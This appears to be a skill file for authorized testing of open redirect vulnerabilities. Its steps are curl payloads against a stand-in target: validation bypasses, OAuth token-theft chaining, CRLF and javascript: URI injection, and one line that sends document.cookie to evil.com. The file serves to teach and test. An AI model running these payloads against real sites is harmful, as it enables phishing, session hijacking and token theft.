---
name: testing-for-open-redirect-vulnerabilities
description: "Identifies and exploits open redirect vulnerabilities. Signals: web vulnerabilities, injection, SQL injection."
zh-signals: "Identifies and exploits open redirect vulnerabilities by analyzing URL 信号:web漏洞,注入,sql注入。"
when-to-use: Identifies and exploits open redirect vulnerabilities by analyzing URL
  redirection parameters (next, url, redirect, return, goto), applying bypass techniques,
  and chaining findings into phishing or token-theft exploits, using Burp Suite/OWASP ZAP
  and Burp Collaborator. Use when testing login/logout flows, OAuth redirect_uri handling,
  or SSO redirect validation.
domain: cybersecurity
subdomain: web-application-security
tags:
- open-redirect
- url-redirect
- phishing
- owasp
- url-validation
- redirect-bypass
- unvalidated-redirect
version: '1.0'
author: mahipal
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
mitre_attack:
- T1190
- T1059.007
- T1505.003
- T1083
- T1566
---

# Testing for Open Redirect Vulnerabilities

## When to Use
- When testing login/logout flows that redirect users to specified URLs
- During assessment of OAuth authorization endpoints with redirect_uri parameters
- When auditing applications with URL parameters (next, url, redirect, return, goto, target)
- During phishing simulation to chain open redirects with credential harvesting
- When testing SSO implementations for redirect validation weaknesses

## Prerequisites
- Burp Suite or OWASP ZAP for intercepting redirect requests
- Collection of open redirect bypass payloads
- External domain or Burp Collaborator for redirect confirmation
- Understanding of URL parsing and encoding schemes
- Browser with developer tools for observing redirect chains
- Knowledge of HTTP 301/302/303/307/308 redirect status codes


> **Legal Notice:** This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## Workflow

### Step 1 — Identify Redirect Parameters
```bash
# Common redirect parameter names to test:
# ?url= ?redirect= ?next= ?return= ?returnUrl= ?goto= ?target=
# ?dest= ?destination= ?redir= ?redirect_uri= ?continue= ?view=

# Search for redirect parameters in the application
# Use Burp Suite to crawl and identify all parameters

# Test basic redirect
curl -v "http://target.com/login?next=https://evil.com"
curl -v "http://target.com/logout?redirect=https://evil.com"
curl -v "http://target.com/oauth/authorize?redirect_uri=https://evil.com"
```

### Step 2 — Test Basic Open Redirect Payloads
```bash
# Direct external URL
curl -v "http://target.com/redirect?url=https://evil.com"

# Protocol-relative URL
curl -v "http://target.com/redirect?url=//evil.com"

# URL with @ symbol (userinfo abuse)
curl -v "http://target.com/redirect?url=https://target.com@evil.com"

# Backslash-based redirect
curl -v "http://target.com/redirect?url=https://evil.com\@target.com"

# Null byte injection
curl -v "http://target.com/redirect?url=https://evil.com%00.target.com"
```

### Step 3 — Apply Validation Bypass Techniques
```bash
# Subdomain confusion bypass
curl -v "http://target.com/redirect?url=https://target.com.evil.com"
curl -v "http://target.com/redirect?url=https://evil.com/target.com"

# URL encoding bypass
curl -v "http://target.com/redirect?url=https%3A%2F%2Fevil.com"
curl -v "http://target.com/redirect?url=%68%74%74%70%73%3a%2f%2f%65%76%69%6c%2e%63%6f%6d"

# Double URL encoding
curl -v "http://target.com/redirect?url=%2568%2574%2574%2570%253A%252F%252Fevil.com"

# Mixed case protocol
curl -v "http://target.com/redirect?url=HtTpS://evil.com"

# CRLF injection in redirect
curl -v "http://target.com/redirect?url=%0d%0aLocation:%20https://evil.com"

# JavaScript protocol
curl -v "http://target.com/redirect?url=javascript:alert(document.domain)"

# Data URI
curl -v "http://target.com/redirect?url=data:text/html,<script>alert(1)</script>"
```

### Step 4 — Test Path-Based Redirects
```bash
# Relative path injection
curl -v "http://target.com/redirect?url=/\evil.com"
curl -v "http://target.com/redirect?url=/.evil.com"

# Path traversal with redirect
curl -v "http://target.com/redirect?url=/../../../evil.com"

# Fragment-based bypass
curl -v "http://target.com/redirect?url=https://evil.com#target.com"

# Parameter pollution for redirect
curl -v "http://target.com/redirect?url=https://target.com&url=https://evil.com"
```

### Step 5 — Chain with Other Vulnerabilities
```bash
# Chain with OAuth for token theft
# Step 1: Find open redirect on target.com
# Step 2: Use it as redirect_uri in OAuth flow
curl -v "http://target.com/oauth/authorize?client_id=CLIENT&redirect_uri=http://target.com/redirect?url=https://evil.com&response_type=code"

# Chain with phishing
# Create convincing phishing page at evil.com
# Use open redirect: http://target.com/redirect?url=https://evil.com/login
# Victim sees target.com in the initial URL

# Chain with XSS via javascript: protocol
curl -v "http://target.com/redirect?url=javascript:fetch('https://evil.com/?c='+document.cookie)"
```

### Step 6 — Automate Open Redirect Testing
```bash

> 📎 详细内容（完整示例 / 参考 / 数据表）已拆分至同目录 `reference.md`，按需用 Read 读取对应小节。
